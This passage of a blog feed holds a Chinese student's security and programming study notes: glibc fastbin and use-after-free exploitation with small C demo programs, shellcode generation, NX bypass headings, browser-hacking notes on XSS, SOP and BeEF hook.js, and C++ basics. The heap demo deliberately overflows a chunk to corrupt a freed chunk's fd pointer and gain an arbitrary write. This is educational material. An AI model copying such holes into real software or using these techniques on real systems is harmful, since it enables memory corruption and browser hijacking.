<p><a href="https://lightless.me/archives/docker-honeypot.html" target="_blank" rel="external">https://lightless.me/archives/docker-honeypot.html</a> docker蜜罐</p>
<p><a href="https://lightless.me/archives/kokkuri-s-revenge.html" target="_blank" rel="external">https://lightless.me/archives/kokkuri-s-revenge.html</a> 反击</p>
<p><a href="https://nota.moe/2016/special-comment-tokens-in-javascript/" target="_blank" rel="external">https://nota.moe/2016/special-comment-tokens-in-javascript/</a> 段子</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[数据预处理]]></title>
      <url>/2017/06/23/%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/</url>
      <content type="html"><![CDATA[<h1 id="为什么进行"><a href="#为什么进行" class="headerlink" title="为什么进行"></a>为什么进行</h1><ul>
<li>缺失</li>
<li>噪声</li>
<li>不一致</li>
<li>维度太高 (这个算不算)</li>
</ul>
<h1 id="有这些方法"><a href="#有这些方法" class="headerlink" title="有这些方法"></a>有这些方法</h1><ul>
<li>数据集成(Data Integration), 多个数据源里的数据综合到一个一致的数据存储<ul>
<li>处理冗余数据</li>
<li>数据冲突</li>
</ul>
</li>
<li>数据清理(Data Cleaning)<ul>
<li>补充<code>缺失值</code><ul>
<li>均值</li>
<li>忽略</li>
<li>可能的值</li>
<li>…</li>
</ul>
</li>
<li>修正<code>不一致的数据</code></li>
<li>识别异常并平滑<code>噪音数据</code><ul>
<li>聚类</li>
<li>回归</li>
<li>分箱(Binning method)</li>
</ul>
</li>
</ul>
</li>
<li>数据变换(Data Transformation)</li>
<li>数据规约/简化(Data Reduction)<ul>
<li>获得原始数据集(超级大)的一个简约表示</li>
<li>容量上大大减少，但仍然接近原始数据的完整性并产生(基本)相同的分析结果</li>
<li>比如 维数规约 数值压缩</li>
</ul>
</li>
<li>数据融合(Data Fusion)</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wenku.baidu.com/view/438f85a2aa00b52acfc7caa0.html" target="_blank" rel="external">https://wenku.baidu.com/view/438f85a2aa00b52acfc7caa0.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 周五 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[msf生成payload]]></title>
      <url>/2017/06/09/msf%E7%94%9F%E6%88%90payload/</url>
      <content type="html"><![CDATA[<p>经常看到别人pwn题解里的shellcode直接都是<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">shellcode = <span class="string">""</span></div><div class="line">shellcode += <span class="string">"some_binary_code"</span></div><div class="line">shellcode += <span class="string">"some_binary_code"</span></div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>然后还是想过他们是手敲上去的???</p>
<p>我的天,我真的是好蠢<br>后来发现好像是有两种方式</p>
<ol>
<li>有专门的网站可以搜</li>
<li>可以直接用msf生成一个 </li>
</ol>
<p>哦,这个是我在看这篇文章的时候发现的<br><a href="http://www.vuln.cn/6329" target="_blank" rel="external">http://www.vuln.cn/6329</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门6-heap]]></title>
      <url>/2017/06/09/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A86-heap/</url>
      <content type="html"><![CDATA[<p>转接<a href="/2017/05/16/堆溢出/">堆溢出</a></p>
<h2 id="继续学习"><a href="#继续学习" class="headerlink" title="继续学习"></a>继续学习</h2><h4 id="fastbin-amp-UAF"><a href="#fastbin-amp-UAF" class="headerlink" title="fastbin &amp; UAF"></a>fastbin &amp; UAF</h4><p>首先注意fast chunk的标志位<code>p</code>总是1的,所以没办法辨别某一块到底是不是在用,只能通过fd</p>
<p><a href="http://www.freebuf.com/news/88660.html" target="_blank" rel="external">http://www.freebuf.com/news/88660.html</a> 这一片里面提到</p>
<blockquote>
<p>当然，在实际执行分配或回收时，还会对目标chunk的大小进行检查。但如果能够修改fd内容，那么在随后的malloc时便可能将修改后的地址返回，这进一步往往能够造成向任意地址写任意内容(write-anything-anywhere)的后果。<br>操作在于溢出,写到<code>fd</code>的内容,而漏洞发生在于,由于<code>fd</code>被改写,所以在<code>malloc</code>的时候可能会返回任意你想要的地址<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"><span class="comment">//这个p由于你前面改写`fd`,这个返回奇怪的地址,之后你对这个地址写就</span></div></pre></td></tr></table></figure></p>
</blockquote>
<p>这个文章前面其实说的很清楚,malloc两个chunk,后来的最为fastbin表里的index,当第二个chunk释放的时候,第二块chunk里的<code>fd</code>所指向的地方(正常情况下是第一块chunk的地址)会作为该fastbin的首块chunk的地址,如果我们能以某种方式改掉这个后来的这个块的fd到任意地址(通过堆溢出)那么我们在两次malloc,两次free(这前四次操作都是正常操作),再两次malloc,再进行最后一次malloc(第五次)就能获得任意地址,然后实现任意地址写,不知道理解对不对</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> size = <span class="number">40</span> | <span class="number">0x1</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">    <span class="keyword">void</span> *buf0, *buf1, *buf2;</div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    <span class="built_in">free</span>(buf1);     <span class="comment">//注意这里先释放了buf1</span></div><div class="line">    <span class="built_in">free</span>(buf0);     <span class="comment">//这个时候两块chunk已经放到了fastbin里</span></div><div class="line">    buf0 = <span class="built_in">malloc</span>(<span class="number">32</span>);      <span class="comment">//取走一块</span></div><div class="line"></div><div class="line">    read(<span class="number">0</span>, buf0, <span class="number">64</span>); <span class="comment">// 利用取走的这块的写操作,这个地方改写到buf1的fd</span></div><div class="line">    buf1 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line">    buf2 = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"buf2 is at %p\n"</span>, buf2);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a> (英文的,但好多人都推荐)<br><a href="http://blog.csdn.net/maokelong95/article/details/51989081" target="_blank" rel="external">http://blog.csdn.net/maokelong95/article/details/51989081</a> (上面那一篇的翻译版)<br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a> (这个是好像很不错的样子，已经star)</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门7-UAF]]></title>
      <url>/2017/06/09/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A87-UAF/</url>
      <content type="html"><![CDATA[<h2 id="hhh"><a href="#hhh" class="headerlink" title="hhh"></a>hhh</h2><p>很明显我还没学会</p>
<h2 id="只是在网上看到一个大佬写的"><a href="#只是在网上看到一个大佬写的" class="headerlink" title="只是在网上看到一个大佬写的"></a>只是在网上看到一个大佬写的</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">char</span> * p1;</div><div class="line">    p1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">10</span>);</div><div class="line">    <span class="built_in">memcpy</span>(p1, <span class="string">"hello"</span>, <span class="number">10</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"p1 addr: %p, %s\n"</span>, p1, p1);</div><div class="line">    <span class="built_in">free</span>(p1);</div><div class="line">    <span class="keyword">char</span> * p2;</div><div class="line">    p2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">10</span>);</div><div class="line">    <span class="built_in">memcpy</span>(p2, <span class="string">"world"</span>, <span class="number">10</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"p2 addr: %p, %s\n"</span>, p2, p1);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>就是p1释放之后,p2申请同样大小的堆块的时候会把原来p1的那块给他<br>应该就是fastbin上分过来的吧</p>
<h2 id="又找到几篇文章"><a href="#又找到几篇文章" class="headerlink" title="又找到几篇文章"></a>又找到几篇文章</h2><p><a href="http://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="external">http://www.cnblogs.com/Ox9A82/p/5865420.html</a><br><a href="http://www.vuln.cn/6653" target="_blank" rel="external">http://www.vuln.cn/6653</a> (只想说这个,我没看懂)<br><a href="http://www.vuln.cn/6654" target="_blank" rel="external">http://www.vuln.cn/6654</a> (<a href="http://whereisk0shl.top/myarticle" target="_blank" rel="external">http://whereisk0shl.top/myarticle</a> 里提到的原来在wooyun的文章)</p>
<p>虽然没看懂,但几下关键词<code>fake chunk</code><br>他这个<code>pwn me</code>是<code>fastbin</code><br>对于free掉的<code>fastbin块</code>,原来data区域的开头的几个字节现在是放了<code>fd</code>指针<br>这道题目中这个<code>fd</code>的位置在还没有释放的时候存的是结构体的<code>rank</code>,所以要通过<code>rank</code>来泄露堆地址</p>
<p>后面的我是真的看不懂的了,我好菜啊==</p>
<h2 id="参考-还没看"><a href="#参考-还没看" class="headerlink" title="参考(还没看)"></a>参考(还没看)</h2><p><a href="http://www.freebuf.com/articles/web/69260.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/69260.html</a><br><a href="http://bobao.360.cn/ctf/learning/149.html" target="_blank" rel="external">http://bobao.360.cn/ctf/learning/149.html</a><br><a href="http://www.cnblogs.com/0xJDchen/p/6175651.html" target="_blank" rel="external">http://www.cnblogs.com/0xJDchen/p/6175651.html</a></p>
<h2 id="还找到这样一个"><a href="#还找到这样一个" class="headerlink" title="还找到这样一个"></a>还找到这样一个</h2><p><a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">https://github.com/shellphish/how2heap</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pwn无法入门5-mmap mprotect]]></title>
      <url>/2017/06/08/pwn%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A85-mmap-mprotect/</url>
      <content type="html"><![CDATA[<h2 id="why"><a href="#why" class="headerlink" title="why"></a>why</h2><p>可以去绕过NX来跑shellcode</p>
<h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><h2 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://weeklyalgo.codes/2017/05/07/execute%20shellcode%20with%20mmap%20and%20mprotect/" target="_blank" rel="external">http://weeklyalgo.codes/2017/05/07/execute%20shellcode%20with%20mmap%20and%20mprotect/</a></li>
<li>蒸米的文章</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器篇]]></title>
      <url>/2017/06/05/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>在图书馆借到了<code>浏览器攻防指南:浏览器篇</code><br>答题浏览了一下,感觉好多关于浏览器的hack,比之前借的那本<code>白帽子讲浏览器感觉更深</code><br>这个作者好像是Beef的作者,于是装了个Beef,只要把hook.js丢到网站上面去就可以<code>hook</code>住访问网页的浏览器,然后弹个框啥的,不是说只能弹框,是我只会弹框,并且看了下居然没有人翻译过beef的文档</p>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><p>这一章主要回忆了一下几种xss:</p>
<ul>
<li>反射型</li>
<li>持久型</li>
<li>DOM型 这里提到DOM类是完全由前端造成的,主要是JavaScript<br>前两种可以认为是主要是服务器端造成的<br>后一种是客户端造成的(主要通过<code>#</code>)</li>
</ul>
<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p>讲到了一些JavaScript小strick<br>还提到了通过DNS,websocket等方法来持久化<br>前一段时间的cuit校赛就有一道<code>DNS</code>来绕过ip检查的,我其实并不太懂,还有好像记得<code>SQLi</code>也有<code>DNS</code>做带外通道的,啊,这一块完全是空白,我好菜咩,还有说到的<code>DNS预取</code><br>还有提到了一些跨域的策略,我只关注过那个<code>CORS</code>,还有其他的也不太会<br>提到了为了实现可持久化,<code>IFRAME</code>是首选</p>
<h2 id="第四章-绕过同源策略"><a href="#第四章-绕过同源策略" class="headerlink" title="第四章 绕过同源策略"></a>第四章 绕过同源策略</h2><p>这一章的内容应该算是我薄弱的地方了?之前看大佬的blog有花式绕过csp,学到了一点,这本书对于我来说还是挺不错的</p>
<h3 id="SOP"><a href="#SOP" class="headerlink" title="SOP"></a>SOP</h3><p>SOP 同源策略, 要主机名,协议,端口号都相同</p>
<p>有的时候我们要在同一根域名下不同主机间通信<br><code>store.xxx.com</code>可能要通过<code>login.xxx.com</code>来验证登录<br>这个时候可以使用这种操作<br>给两个子域都设置<code>document.domain = xxx.com</code>, 但注意这之后再改回<code>store.xxx.com</code>就会报错</p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>情景描述: 默认情况下,如果<code>*.xxx.com</code>使用XHR想不同来源比如<code>hacker.com</code>发送请求,那你就会读不到响应.但是请求还是会到达目标网站 (这个情景描述的很清楚,我喜欢)</p>
<p>解决方式就是在目标服务器<code>hacker.com</code>上返回下面的http响应头部<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *.xxx.com</div></pre></td></tr></table></figure></p>
<p>这一章讲了许多针对性的<code>sop</code>绕过,比如针对各大浏览器(可能已经修复了),Flash,等等</p>
<p>然后讲了一下</p>
<ul>
<li>点击劫持(通常是透明的IFrame实现),可以绕过<code>CSRF token</code></li>
<li>光标劫持</li>
<li>文件劫持</li>
<li>等等…</li>
</ul>
<blockquote>
<p>CSRF token 即使能伪造一个表单,诱骗用户提交,但由于伪造不出来csrf token,所以攻击也会无效</p>
</blockquote>
<p>只是泛读了一下,和我想的不一样….</p>
<h2 id="第五章-攻击用户"><a href="#第五章-攻击用户" class="headerlink" title="第五章 攻击用户"></a>第五章 攻击用户</h2>]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[数据结构从入门到无法入门]]></title>
      <url>/2017/06/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%97%A0%E6%B3%95%E5%85%A5%E9%97%A8/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[C++ 面向对象 从入门到入门]]></title>
      <url>/2017/06/04/C-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>突然发现自己不会使用C++,所以要入门一下<br>因为是入门,所以可能有很多错误<br>先写概念,然后补上例子</p>
<h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><blockquote>
<p>静态的成员变量属于类,也可以通过实例来调用,但静态可以直接使用ClassName::method()的方法就可以使用,就像是工具类,而静态的成员变量可以记录公共的信息,比如实例的个数<br>hack点: 静态成员变量使用前必须先初始化,后面我们会说怎么初始化,有两种方法,一种是c++ 11的新方法, 还有赋值与初始化的区别</p>
</blockquote>
<ul>
<li>静态成员函数中不能调用非静态成员,因为非静态的属于实例</li>
<li>非静态成员函数中可以调用静态成员,因为静态成员属于类</li>
</ul>
<h2 id="const-以后填坑"><a href="#const-以后填坑" class="headerlink" title="const (以后填坑)"></a>const (以后填坑)</h2><blockquote>
<p>在c++中const定义的变量一般是不分配内存的，和C语言中的#define。但是在c语言中const是默认分配的</p>
</blockquote>
<p>const 有顶层const,底层const<br>修饰指针变量的时候有<code>变量本身不可变</code>和<code>变量指向的内容不可变</code></p>
<h3 id="函数参数列表后-函数体前-这个位置加-const作用-然后填"><a href="#函数参数列表后-函数体前-这个位置加-const作用-然后填" class="headerlink" title="函数参数列表后 函数体前 这个位置加 const作用 (然后填)"></a>函数参数列表后 函数体前 这个位置加 const作用 (然后填)</h3><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><h2 id="构造函数-hack点"><a href="#构造函数-hack点" class="headerlink" title="构造函数 + hack点"></a>构造函数 + hack点</h2><p>这两种方式初始化有什么区别咩<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        A():a(<span class="number">3</span>)&#123;<span class="built_in">printf</span>(<span class="string">"a is %d\n"</span>, a);&#125;;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">int</span> a;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        B()&#123;<span class="built_in">printf</span>(<span class="string">"b is %d\n"</span>, b);&#125;;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">int</span> b = <span class="number">3</span>;</div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    A a1;</div><div class="line">    B b1;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个A和B中成员变量的初始化是不是没有区别啊,只是发现这个B中类内成员的这种初始化方法好像是<code>C++ 11</code>开始支持的<br>所以会报这个warning,然后我没加<code>std=c++11</code>,难道是编译器自己帮我加了?</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">15</span> col <span class="number">17</span>| warning: non-<span class="keyword">static</span> data member initializers only available with -<span class="built_in">std</span>=c++<span class="number">11</span></div></pre></td></tr></table></figure>
<p>不过咩,注意以上两种都是初始化如果写成<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        C()&#123;c = <span class="number">3</span>;<span class="built_in">printf</span>(<span class="string">"c is %d\n"</span>, c);&#125;;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">int</span> c;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>这个就不是初始化了,这个c算是赋值,这里看起来没问题对吧,但在某些情况下有些成员变量就不能赋值,只能初始化(就是传说中的那种不能变的对象)比如<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        C()&#123;c = <span class="number">3</span>;<span class="built_in">printf</span>(<span class="string">"c is %d\n"</span>, c);&#125;;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">         <span class="keyword">const</span> <span class="keyword">int</span> c;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>这样做的话,就会报错<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error: assignment of read-only member ‘C::c’</div></pre></td></tr></table></figure></p>
<p>而必须采用上面A或者B的方法,看起来是A的方法兼容好一些,我以后就A这样子写吧<br>除了<code>const</code>外,<code>reference</code>也只能初始化,不能赋值.这也是指针和引用的有些不同</p>
<ul>
<li>引用必须被初始化,指针可以不</li>
<li>引用初始化后不能改变其值</li>
<li>不存在指向空值的引用</li>
</ul>
<p>刚查资料,看到人家满满的证书,同样是大三了,我好菜啊,C++都不会,突然又想学算法了<br><a href="https://www.liuchuo.net/about" target="_blank" rel="external">https://www.liuchuo.net/about</a></p>
<p>继续<br>hack点: 静态成员变量不能类内初始化,因为静态的其实是属于类的,我们可以叫他<code>类变量</code>(可以这样子叫吗,反正我就这样子叫了),需要在类外初始化<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        A();</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">3</span>;</div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    A a;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这样子是会报error的<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">error: ISO C++ forbids in-<span class="class"><span class="keyword">class</span> <span class="title">initialization</span> <span class="title">of</span> <span class="title">non</span>-<span class="title">const</span> <span class="title">static</span> <span class="title">member</span> ‘<span class="title">A</span>:</span>:a’</div></pre></td></tr></table></figure></p>
<p>看起来是只有<code>const</code>的<code>static</code>才能类内初始化了<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></div><div class="line">    <span class="keyword">public</span>:</div><div class="line">        A()&#123;<span class="built_in">puts</span>(<span class="string">"Hello A"</span>);&#125;;</div><div class="line">    <span class="keyword">private</span>:</div><div class="line">        <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">3</span>;</div><div class="line">&#125;;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">    A a;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们加了个const果然通过了<br>所以<code>static</code>的成员变量要类外初始化<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> A::a = <span class="number">1</span>;</div></pre></td></tr></table></figure></p>
<h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><h2 id="申明"><a href="#申明" class="headerlink" title="申明"></a>申明</h2><ul>
<li><code>构造函数</code>申明不能包含初始化参数列表</li>
<li><code>派生类</code>申明不能包含派生列表</li>
</ul>
<h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><p>final 可以防止继承发生(Java里面好像也是这样子吧)</p>
<h2 id="静态类型-amp-动态类型"><a href="#静态类型-amp-动态类型" class="headerlink" title="静态类型 &amp; 动态类型"></a>静态类型 &amp; 动态类型</h2><ul>
<li>如果表达式不是<code>指针</code>或者<code>引用</code>的话,那他的动态和静态类型就是一样的</li>
<li>指针或者引用的静态类型和动态类型不同这一事实正是C++支持多态的根本所在</li>
</ul>
<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><blockquote>
<p>基类虚函数设计出来大部分是为了让子类来override实现多态的</p>
</blockquote>
<p>hack点: 我们必须为每一个虚函数都提供定义<br>当某个虚函数通过指针或者引用调用的时候,编译器产生的代码直到运行时才能知道该调用哪一个(动态绑定),好吧,感觉这句话提到了N次</p>
<p>个人理解:<br>动态 =&gt; 运行时<br>静态 =&gt; 编译时<br>这里突然想到了<code>动态链接库dll(Linux *.so)</code>和<code>静态链接库lib(Linux *.a)</code></p>
<p>hack点: 只有虚函数能override,此时参数列表和返回值应该一致,相当于是基类规定了接口,派生类里你要照着子类的接口规范来override虚函数(还有好像是说,派生类里有virtual字样,子类override对应函数就可以不写virtual字样了), 那种参数列表不一样的就是重载啦,和我们这个木有关系,好像是重载是编译时就确定了的吧</p>
<blockquote>
<p>只有类的普通成员函数可以定义为虚函数，全局函数及静态成员函数（类拥有）不能声明为虚函数。</p>
</blockquote>
<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>我理解多态主要是由虚函数来体现的</p>
<blockquote>
<p>当我们使用基类(静态类型)的引用或者指针调用基类中定义的一个函数时候,我们并不知道这个函数真正作用的对象,他可能是一个基类对象也可能是一个派生类的对象.如果这个函数是虚函数,那么直到运行时才会决定到底执行哪个版本.判断的依据是引用或者指针所绑定的对象的真实类型.</p>
</blockquote>
<p>综合上面,只有当</p>
<ol>
<li>通过指针或者引用</li>
<li>来调用虚函数的时候<br>才可能出现运行时绑定,即为动态和静态类型不同</li>
</ol>
<blockquote>
<p>注意下文提到的各种转换,如果没有特别强调,说的都是对象指针类型,不是对象类型</p>
</blockquote>
<p>一定要注意这两个条件<br>如果函数不虚也可以哦…不虚的函数也是编译时候就确定了,就是看静态类型<br>一个栗子,学会了个单词</p>
